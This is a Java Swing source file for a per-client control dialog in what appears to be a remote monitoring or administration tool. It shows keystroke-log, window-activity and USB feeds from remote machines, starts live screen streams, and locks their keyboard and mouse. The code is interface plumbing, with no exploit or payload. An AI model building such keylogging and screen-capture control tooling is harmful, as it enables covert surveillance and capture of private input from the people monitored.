package com.acs.ui;

import com.acs.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;

/**
 * Per-client control dialog.
 *
 * Handles two states:
 *   CONNECTED    — stream buttons active, activity + keylog feeds live
 *   DISCONNECTED — all action buttons disabled, "Remove" button shown,
 *                  logs still viewable
 *
 * Two-tab feed area:
 *   Tab 1 — Activity (app/window tracking)
 *   Tab 2 — Keylog   (keystroke bursts)
 */
public class ClientDetailDialog extends JFrame {

    // ── Palette ───────────────────────────────────────────────────────────────
    private static final Color BG             = new Color(12,  17,  30);
    private static final Color PANEL_BG       = new Color(18,  25,  42);
    private static final Color BORDER_C       = new Color(35,  50,  85);
    private static final Color ACCENT         = new Color(0,  200, 255);
    private static final Color ACCENT_DISCONN = new Color(80,  85, 110);
    private static final Color TEXT           = new Color(220, 230, 255);
    private static final Color TEXT_DIM       = new Color(110, 135, 175);
    private static final Color TEXT_DISCONN   = new Color(80,   85, 110);
    private static final Color COLOR_GREEN    = new Color(0,  210, 110);
    private static final Color COLOR_RED      = new Color(255,  68, 102);
    private static final Color COLOR_CYAN     = new Color(0,  200, 255);
    private static final Color COLOR_ORANGE   = new Color(255, 160,   0);
    private static final Color COLOR_YELLOW   = new Color(255, 200,  50);
    private static final Color COLOR_GREY     = new Color(80,   85, 110);
    private static final Color COLOR_PINK     = new Color(255, 130, 180);
    private static final Color FEED_BG        = new Color(8,   12,  22);

    // ── State ─────────────────────────────────────────────────────────────────
    private final ClientHandler handler;
    private final String        serverIp;
    private final int           serverPort;
    private final ClientCard    card;
    private final ServerUI      serverUI;

    private JLabel  titleLabel;
    private JLabel  connectionStatusLabel;
    private JLabel  disconnectTimeLabel;
    private JLabel  streamStatusLabel;
    private JLabel  activityStatusLabel;
    private JLabel  keylogStatusLabel;
    private JLabel  usbStatusLabel;
    private JLabel  lockStatusLabel;
    private JButton streamToggleBtn;
    private JButton disconnectBtn;
    private JButton removeBtn;
    private JButton lockToggleBtn;

    private JTextArea activityFeed;
    private JTextArea keylogFeed;
    private JTextArea usbFeed;              // ← USB tab
    private boolean closingQuietly = false;

    // ─────────────────────────────────────────────────────────────────────────

    public ClientDetailDialog(Window parent, ClientHandler handler,
                               String serverIp, int serverPort, ClientCard card) {
        super("Client — " + displayTitle(handler));

        this.handler    = handler;
        this.serverIp   = serverIp;
        this.serverPort = serverPort;
        this.card       = card;
        this.serverUI   = (ServerUI) parent;

        setSize(UIScale.scale(700), UIScale.scale(720));
        setMinimumSize(UIScale.dim(600, 560));
        setResizable(true);
        setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        setLocationRelativeTo(parent);

        getContentPane().setBackground(BG);
        setLayout(new BorderLayout(0, 0));

        add(buildHeader(),  BorderLayout.NORTH);
        add(buildMain(),    BorderLayout.CENTER);
        add(buildFooter(),  BorderLayout.SOUTH);

        // Pre-populate feeds from persisted in-memory logs
        for (String line : handler.getActivityLog()) appendActivity(line);
        for (String line : handler.getKeylogLog())   appendKeylog(line);
        for (String line : handler.getUsbLog())      appendUsb(line);

        // Register live listeners only if client is alive
        if (handler.isClientAlive()) {
            handler.setActivityListener(this::onActivityReceived);
            handler.setKeylogListener(this::onKeylogReceived);
            handler.setUsbListener(this::onUsbReceived);
        }

        // Apply correct state
        boolean isStreaming = StreamManager.getActiveStreamClient() == handler;
        applyStreamingState(isStreaming);
        applyActivityState(ActivityState.isMonitoring());
        applyLockState(handler.isInputLocked());
        applyDisconnectedState(handler.isDisconnected());

        // Register lock listener for real-time updates
        handler.setLockListener(locked -> SwingUtilities.invokeLater(() -> applyLockState(locked)));

        addWindowListener(new WindowAdapter() {
            @Override public void windowClosing(WindowEvent e) {
                if (!closingQuietly) doClose();
            }
        });
    }

    // ── Layout ────────────────────────────────────────────────────────────────

    private JPanel buildHeader() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBackground(PANEL_BG);
        panel.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createMatteBorder(0, 0, 1, 0, BORDER_C),
                BorderFactory.createEmptyBorder(UIScale.scale(18), UIScale.scale(22), UIScale.scale(18), UIScale.scale(22))));

        titleLabel = new JLabel("⬡ " + displayTitle(handler));
        titleLabel.setFont(UIScale.font("Consolas", Font.BOLD, 18));
        titleLabel.setForeground(handler.isDisconnected() ? ACCENT_DISCONN : ACCENT);

        JLabel sub = new JLabel("Client Control Panel");
        sub.setFont(UIScale.font("Consolas", Font.PLAIN, 12));
        sub.setForeground(TEXT_DIM);

        JPanel left = new JPanel();
        left.setLayout(new BoxLayout(left, BoxLayout.Y_AXIS));
        left.setBackground(PANEL_BG);
        left.add(titleLabel);
        left.add(Box.createVerticalStrut(UIScale.scale(3)));
        left.add(sub);

        panel.add(left, BorderLayout.WEST);
        return panel;
    }

    private JPanel buildMain() {
        JPanel panel = new JPanel(new BorderLayout(0, 0));
        panel.setBackground(BG);

        // Wrap controls in a scroll pane so they remain accessible on small windows
        JPanel controls = buildControls();
        JScrollPane controlScroll = new JScrollPane(controls);
        controlScroll.setBackground(BG);
        controlScroll.getViewport().setBackground(BG);
        controlScroll.setBorder(null);
        controlScroll.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        controlScroll.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        controlScroll.getVerticalScrollBar().setUnitIncrement(UIScale.scale(12));

        // Use a split pane so both controls and feeds are always visible
        JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, controlScroll, buildFeedTabs());
        split.setBackground(BG);
        split.setBorder(null);
        split.setDividerSize(UIScale.scale(6));
        split.setResizeWeight(0.45);  // controls get ~45% of the space
        split.setContinuousLayout(true);

        panel.add(split, BorderLayout.CENTER);
        return panel;
    }

    private JPanel buildControls() {
        JPanel panel = new JPanel();
        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
        panel.setBackground(BG);
        panel.setBorder(BorderFactory.createEmptyBorder(UIScale.scale(18), UIScale.scale(28), UIScale.scale(12), UIScale.scale(28)));

        String[] parts = handler.getClientId().split(":", 2);
        String hostname3 = handler.getHostname();
        if (hostname3 != null) {
            panel.add(infoRow("Hostname", hostname3));
            panel.add(Box.createVerticalStrut(UIScale.scale(6)));
        }
        panel.add(infoRow("IP Address", parts[0]));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));
        panel.add(infoRow("Port", parts.length > 1 ? parts[1] : "—"));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));

        connectionStatusLabel = new JLabel(handler.isDisconnected() ? "Disconnected" : "Active");
        connectionStatusLabel.setFont(UIScale.font("Consolas", Font.BOLD, 13));
        connectionStatusLabel.setForeground(handler.isDisconnected() ? COLOR_GREY : COLOR_GREEN);
        panel.add(labeledRow("Connection", connectionStatusLabel));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));

        disconnectTimeLabel = new JLabel(
                handler.getDisconnectTimestamp() != null ? handler.getDisconnectTimestamp() : "—");
        disconnectTimeLabel.setFont(UIScale.font("Consolas", Font.BOLD, 13));
        disconnectTimeLabel.setForeground(handler.isDisconnected() ? COLOR_GREY : TEXT_DIM);
        panel.add(labeledRow("Disconnected At", disconnectTimeLabel));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));

        streamStatusLabel   = statusLabel("● Idle", COLOR_GREEN);
        activityStatusLabel = statusLabel("● Idle", TEXT_DIM);
        keylogStatusLabel   = statusLabel("● Idle", TEXT_DIM);
        usbStatusLabel      = statusLabel("● Idle", TEXT_DIM);

        panel.add(labeledRow("Stream Status",    streamStatusLabel));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));
        panel.add(labeledRow("Activity Monitor", activityStatusLabel));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));
        panel.add(labeledRow("Keylog",           keylogStatusLabel));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));
        panel.add(labeledRow("USB Monitor",      usbStatusLabel));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));

        lockStatusLabel = statusLabel(handler.isInputLocked() ? "● Locked" : "● Unlocked",
                handler.isInputLocked() ? COLOR_RED : COLOR_GREEN);
        panel.add(labeledRow("Input Lock",        lockStatusLabel));
        panel.add(Box.createVerticalStrut(UIScale.scale(16)));

        panel.add(sectionLabel("STREAM CONTROL"));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));
        panel.add(buildStreamButtons());
        panel.add(Box.createVerticalStrut(UIScale.scale(10)));

        panel.add(sectionLabel("INPUT LOCK"));
        panel.add(Box.createVerticalStrut(UIScale.scale(6)));
        panel.add(buildLockButtons());
        panel.add(Box.createVerticalStrut(UIScale.scale(10)));

        JLabel note = new JLabel("Activity and keylog monitoring are controlled from the main dashboard.");
        note.setFont(UIScale.font("Consolas", Font.PLAIN, 12));
        note.setForeground(TEXT_DIM);
        note.setAlignmentX(Component.LEFT_ALIGNMENT);
        panel.add(note);
        panel.add(Box.createVerticalStrut(UIScale.scale(10)));

        return panel;
    }

    private JPanel buildStreamButtons() {
        JPanel panel = new JPanel(new GridLayout(1, 3, 10, 0));
        panel.setBackground(BG);
        panel.setMaximumSize(new Dimension(Integer.MAX_VALUE, UIScale.scale(48)));

        streamToggleBtn = actionToggle(
                "▶  Start Stream", COLOR_GREEN,  new Color(0,  28, 14),
                "⏹  Stop Stream",  COLOR_RED,    new Color(38, 10, 15),
                "Start live screen stream",
                "Stop live screen stream");
        disconnectBtn  = actionButton("⊗  Disconnect",   COLOR_ORANGE, new Color(38, 25,  0));
        disconnectBtn.setToolTipText("Disconnect this client");
        removeBtn      = actionButton("✕  Remove",       COLOR_GREY,   new Color(20, 20, 30));
        removeBtn.setToolTipText("Remove disconnected client");

        streamToggleBtn.addActionListener(e -> {
            Boolean streaming = (Boolean) streamToggleBtn.getClientProperty("toggled");
            if (Boolean.TRUE.equals(streaming)) {
                doStopStream();
            } else {
                doStartStream();
            }
        });
        disconnectBtn .addActionListener(e -> doDisconnect());
        removeBtn     .addActionListener(e -> doRemove());

        panel.add(streamToggleBtn);
        panel.add(disconnectBtn);
        panel.add(removeBtn);
        return panel;
    }

    private JPanel buildLockButtons() {
        JPanel panel = new JPanel(new GridLayout(1, 1, 10, 0));
        panel.setBackground(BG);
        panel.setMaximumSize(new Dimension(Integer.MAX_VALUE, UIScale.scale(48)));

        lockToggleBtn = actionToggle(
                "🔒  Lock Input",   COLOR_RED,   new Color(38, 10, 15),
                "🔓  Unlock Input", COLOR_GREEN, new Color(0,  28, 14),
                "Lock keyboard & mouse on this client",
                "Unlock keyboard & mouse on this client");
        lockToggleBtn.addActionListener(e -> {
            Boolean locked = (Boolean) lockToggleBtn.getClientProperty("toggled");
            if (Boolean.TRUE.equals(locked)) {
                doUnlockInput();
            } else {
                doLockInput();
            }
        });

        panel.add(lockToggleBtn);
        return panel;
    }

    /**
     * Three-tab feed: Activity | Keylog | USB.
     * Each tab is a dark JTextArea in a JScrollPane.
     */
    private JTabbedPane buildFeedTabs() {
        activityFeed = buildFeedArea();
        keylogFeed   = buildFeedArea();
        usbFeed      = buildFeedArea();

        JTabbedPane tabs = new JTabbedPane();
        tabs.setBackground(BG);
        tabs.setForeground(TEXT_DIM);
        tabs.setFont(UIScale.font("Consolas", Font.PLAIN, 11));

        tabs.addTab("Activity", wrapFeed(activityFeed));
        tabs.addTab("Keylog",   wrapFeed(keylogFeed));
        tabs.addTab("USB",      wrapFeed(usbFeed));

        tabs.setForegroundAt(1, COLOR_PINK);
        tabs.setForegroundAt(2, new Color(0, 210, 255));  // cyan for USB

        return tabs;
    }

    private JTextArea buildFeedArea() {
        JTextArea area = new JTextArea();
        area.setEditable(false);
        area.setBackground(FEED_BG);
        area.setForeground(new Color(190, 210, 255));
        area.setFont(UIScale.font("Consolas", Font.PLAIN, 11));
        area.setBorder(BorderFactory.createEmptyBorder(UIScale.scale(8), UIScale.scale(12), UIScale.scale(8), UIScale.scale(12)));
        area.setLineWrap(true);
        area.setWrapStyleWord(false);
        return area;
    }

    private JScrollPane wrapFeed(JTextArea area) {
        JScrollPane sp = new JScrollPane(area);
        sp.setBackground(FEED_BG);
        sp.setBorder(BorderFactory.createMatteBorder(1, 0, 0, 0, BORDER_C));
        sp.getViewport().setBackground(FEED_BG);
        sp.getVerticalScrollBar().setBackground(BG);
        return sp;
    }

    private JPanel buildFooter() {
        JPanel footer = new JPanel(new FlowLayout(FlowLayout.RIGHT, 14, 8));
        footer.setBackground(PANEL_BG);
        footer.setBorder(BorderFactory.createMatteBorder(1, 0, 0, 0, BORDER_C));

        JLabel hint = new JLabel("Activity + keylog monitoring controlled from main dashboard");
        hint.setFont(UIScale.font("Consolas", Font.PLAIN, 10));
        hint.setForeground(new Color(60, 80, 120));
        footer.add(hint);
        return footer;
    }

    /**
     * Called by ServerUI.doStopMonitoringAll() — clears all feed text areas.
     * Data is safely saved in session files.
     */
    public void clearFeeds() {
        SwingUtilities.invokeLater(() -> {
            activityFeed.setText("");
            keylogFeed.setText("");
            usbFeed.setText("");
        });
    }

    // ── Stream actions ────────────────────────────────────────────────────────

    private void doStartStream() {
        if (!handler.isClientAlive()) { showClientGone(); return; }
        StreamManager.startStream(serverIp, serverPort, handler);
    }

    private void doStopStream() {
        StreamManager.stopStream(handler);
    }

    private void doDisconnect() {
        int r = JOptionPane.showConfirmDialog(this,
                "Disconnect client " + handler.getClientId() + "?",
                "Confirm Disconnect", JOptionPane.YES_NO_OPTION);
        if (r == JOptionPane.YES_OPTION) {
            StreamManager.stopStream(handler);
            handler.kickAndDisconnect();
            ConnectionManager.removeDisconnectedClient(handler.getClientIp());
            doClose();
        }
    }

    private void doRemove() {
        int r = JOptionPane.showConfirmDialog(this,
                "Remove client " + handler.getClientId() + " from server?\n"
                + "Activity log and keylog will be deleted.",
                "Confirm Remove", JOptionPane.YES_NO_OPTION);
        if (r == JOptionPane.YES_OPTION) {
            ConnectionManager.removeDisconnectedClient(handler.getClientIp());
            doClose();
        }
    }

    private void doClose() {
        handler.clearActivityListener();
        handler.clearKeylogListener();
        handler.clearUsbListener();
        handler.clearLockListener();
        serverUI.onDialogClosed();
        dispose();
    }

    public void closeQuietly() {
        closingQuietly = true;
        handler.clearActivityListener();
        handler.clearKeylogListener();
        handler.clearUsbListener();
        handler.clearLockListener();
        serverUI.onDialogClosed();
        dispose();
    }

    // ── Lock actions ────────────────────────────────────────────────────────

    private void doLockInput() {
        if (!ActivityState.isMonitoring()) return;
        if (!handler.isClientAlive()) { showClientGone(); return; }
        handler.sendLockInput();
    }

    private void doUnlockInput() {
        if (!ActivityState.isMonitoring()) return;
        if (!handler.isClientAlive()) { showClientGone(); return; }
        handler.sendUnlockInput();
    }

    // ── State updates (called from ServerUI) ──────────────────────────────────

    public void updateStreamingState(boolean isStreaming) {
        applyStreamingState(isStreaming);
    }

    public void updateDisconnectedState(ClientHandler disconnectedHandler) {
        SwingUtilities.invokeLater(() -> {
            applyDisconnectedState(true);
            if (disconnectedHandler != null
                    && disconnectedHandler.getDisconnectTimestamp() != null) {
                disconnectTimeLabel.setText(disconnectedHandler.getDisconnectTimestamp());
            }
        });
    }

    // ── State helpers ─────────────────────────────────────────────────────────

    private void applyStreamingState(boolean on) {
        if (streamToggleBtn == null) return;
        setActionToggleState(streamToggleBtn, on);
        streamToggleBtn.setEnabled(handler.isClientAlive());
        streamStatusLabel.setText(on ? "● Streaming" : "● Idle");
        streamStatusLabel.setForeground(on ? COLOR_CYAN : COLOR_GREEN);
    }

    private void applyLockState(boolean locked) {
        if (lockToggleBtn == null) return;
        boolean canLock = handler.isClientAlive() && ActivityState.isMonitoring();
        setActionToggleState(lockToggleBtn, locked);
        lockToggleBtn.setEnabled(canLock);
        lockStatusLabel.setText(locked ? "● Locked" : "● Unlocked");
        lockStatusLabel.setForeground(locked ? COLOR_RED : COLOR_GREEN);
    }

    private void applyActivityState(boolean on) {
        if (activityStatusLabel == null) return;
        activityStatusLabel.setText(on ? "● Monitoring" : "● Idle");
        activityStatusLabel.setForeground(on ? COLOR_YELLOW : TEXT_DIM);
        if (keylogStatusLabel != null) {
            keylogStatusLabel.setText(on ? "● Active" : "● Idle");
            keylogStatusLabel.setForeground(on ? COLOR_PINK : TEXT_DIM);
        }
        if (usbStatusLabel != null) {
            usbStatusLabel.setText(on ? "● Active" : "● Idle");
            usbStatusLabel.setForeground(on ? new Color(0, 210, 255) : TEXT_DIM);
        }
    }

    private void applyDisconnectedState(boolean disconnected) {
        if (streamToggleBtn == null) return;

        if (disconnected) {
            streamToggleBtn.setEnabled(false);
            disconnectBtn.setVisible(false);
            removeBtn.setVisible(true);

            titleLabel.setForeground(ACCENT_DISCONN);
            connectionStatusLabel.setText("Disconnected");
            connectionStatusLabel.setForeground(COLOR_GREY);

            if (handler.getDisconnectTimestamp() != null) {
                disconnectTimeLabel.setText(handler.getDisconnectTimestamp());
                disconnectTimeLabel.setForeground(COLOR_GREY);
            }

            streamStatusLabel.setText("● Idle");   streamStatusLabel.setForeground(COLOR_GREY);
            activityStatusLabel.setText("● Idle");  activityStatusLabel.setForeground(COLOR_GREY);
            keylogStatusLabel.setText("● Idle");    keylogStatusLabel.setForeground(COLOR_GREY);
            usbStatusLabel.setText("● Idle");       usbStatusLabel.setForeground(COLOR_GREY);
            // Lock status preserved — shows whether client was locked when it disconnected
            lockToggleBtn.setEnabled(false);

            String ts = handler.getDisconnectTimestamp() != null
                        ? handler.getDisconnectTimestamp() : "unknown";
            appendActivity("── Client disconnected at " + ts + " ──");
            appendKeylog  ("── Client disconnected at " + ts + " ──");
            appendUsb     ("── Client disconnected at " + ts + " ──");
        } else {
            disconnectBtn.setVisible(true);
            removeBtn.setVisible(false);
            titleLabel.setForeground(ACCENT);
            connectionStatusLabel.setText("Active");
            connectionStatusLabel.setForeground(COLOR_GREEN);
        }
    }

    // ── Feed callbacks ────────────────────────────────────────────────────────

    private void onActivityReceived(String data) {
        SwingUtilities.invokeLater(() -> appendActivity(data));
    }

    private void onKeylogReceived(String data) {
        SwingUtilities.invokeLater(() -> appendKeylog(data));
    }

    private void onUsbReceived(String data) {
        SwingUtilities.invokeLater(() -> appendUsb(data));
    }

    private void appendActivity(String line) { appendTo(activityFeed, line); }
    private void appendKeylog(String line)   { appendTo(keylogFeed,   line); }
    private void appendUsb(String line)      { appendTo(usbFeed,      line); }

    private void appendTo(JTextArea area, String line) {
        area.append(line + "\n");
        area.setCaretPosition(area.getDocument().getLength());
    }

    private void showClientGone() {
        JOptionPane.showMessageDialog(this,
                "Client " + handler.getClientId() + " is no longer connected.",
                "Client Disconnected", JOptionPane.WARNING_MESSAGE);
        applyDisconnectedState(true);
    }

    public String getClientId() { return handler.getClientId(); }

    // ── Widget builders ───────────────────────────────────────────────────────

    private JPanel infoRow(String key, String value) {
        JPanel row = horizontalRow();
        row.add(dimLabel(key), BorderLayout.WEST);
        JLabel v = new JLabel(value);
        v.setFont(UIScale.font("Consolas", Font.BOLD, 13));
        v.setForeground(TEXT);
        row.add(v, BorderLayout.EAST);
        return row;
    }

    private JPanel labeledRow(String key, JLabel valueLabel) {
        JPanel row = horizontalRow();
        row.add(dimLabel(key), BorderLayout.WEST);
        row.add(valueLabel,    BorderLayout.EAST);
        return row;
    }

    private JLabel statusLabel(String text, Color color) {
        JLabel l = new JLabel(text);
        l.setFont(UIScale.font("Consolas", Font.BOLD, 13));
        l.setForeground(color);
        return l;
    }

    private JLabel sectionLabel(String text) {
        JLabel l = new JLabel(text);
        l.setFont(UIScale.font("Consolas", Font.BOLD, 11));
        l.setForeground(TEXT_DIM);
        l.setAlignmentX(Component.LEFT_ALIGNMENT);
        return l;
    }

    private JPanel horizontalRow() {
        JPanel row = new JPanel(new BorderLayout());
        row.setBackground(BG);
        row.setMaximumSize(new Dimension(Integer.MAX_VALUE, UIScale.scale(28)));
        return row;
    }

    private JLabel dimLabel(String text) {
        JLabel l = new JLabel(text);
        l.setFont(UIScale.font("Consolas", Font.PLAIN, 13));
        l.setForeground(TEXT_DIM);
        return l;
    }

    private JButton actionButton(String text, Color fg, Color bg) {
        JButton btn = new JButton(text);
        btn.setFont(UIScale.font("Consolas", Font.BOLD, 13));
        btn.setForeground(fg);
        btn.setBackground(bg);
        btn.setOpaque(true);
        btn.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(fg.darker(), 1),
                BorderFactory.createEmptyBorder(UIScale.scale(8), UIScale.scale(10), UIScale.scale(8), UIScale.scale(10))));
        btn.setFocusPainted(false);
        btn.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        return btn;
    }

    /**
     * Creates a toggle-style action button for the detail dialog.
     */
    private JButton actionToggle(String offText, Color offFg, Color offBg,
                                  String onText,  Color onFg,  Color onBg,
                                  String offTooltip, String onTooltip) {
        JButton btn = new JButton(offText);
        btn.setFont(UIScale.font("Consolas", Font.BOLD, 13));
        btn.setForeground(offFg);
        btn.setBackground(offBg);
        btn.setOpaque(true);
        btn.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(offFg.darker(), 1),
                BorderFactory.createEmptyBorder(UIScale.scale(8), UIScale.scale(10), UIScale.scale(8), UIScale.scale(10))));
        btn.setFocusPainted(false);
        btn.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        btn.setToolTipText(offTooltip);

        btn.putClientProperty("toggled",    false);
        btn.putClientProperty("offText",    offText);
        btn.putClientProperty("onText",     onText);
        btn.putClientProperty("offFg",      offFg);
        btn.putClientProperty("onFg",       onFg);
        btn.putClientProperty("offBg",      offBg);
        btn.putClientProperty("onBg",       onBg);
        btn.putClientProperty("offTooltip", offTooltip);
        btn.putClientProperty("onTooltip",  onTooltip);

        return btn;
    }

    private void setActionToggleState(JButton btn, boolean on) {
        btn.putClientProperty("toggled", on);
        String text    = (String) btn.getClientProperty(on ? "onText"    : "offText");
        Color  fg      = (Color)  btn.getClientProperty(on ? "onFg"      : "offFg");
        Color  bg      = (Color)  btn.getClientProperty(on ? "onBg"      : "offBg");
        String tooltip = (String) btn.getClientProperty(on ? "onTooltip" : "offTooltip");
        btn.setText(text);
        btn.setForeground(fg);
        btn.setBackground(bg);
        btn.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(fg.darker(), 1),
                BorderFactory.createEmptyBorder(UIScale.scale(8), UIScale.scale(10), UIScale.scale(8), UIScale.scale(10))));
        btn.setToolTipText(tooltip);
    }

    private static String displayTitle(ClientHandler handler) {
        String hostname = handler.getHostname();
        return hostname != null
                ? hostname + " (" + handler.getClientIp() + ")"
                : handler.getClientId();
    }
}